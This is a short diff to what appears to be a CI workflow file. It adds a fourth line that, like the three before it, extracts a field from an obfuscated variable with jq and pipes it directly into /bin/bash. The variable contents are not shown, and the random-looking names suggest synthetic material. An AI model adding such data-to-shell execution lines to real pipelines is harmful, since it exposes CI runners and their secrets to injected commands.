@@ -26,6 +26,7 @@ jobs:
           echo $fwk20 | jq -r .hv174 | /bin/bash
           printf '%s' "$lr8" | jq -r .q95757 | /bin/bash
           echo $d573 | jq -r .h70 | /bin/bash
+          echo $n19 | jq -r .e627 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
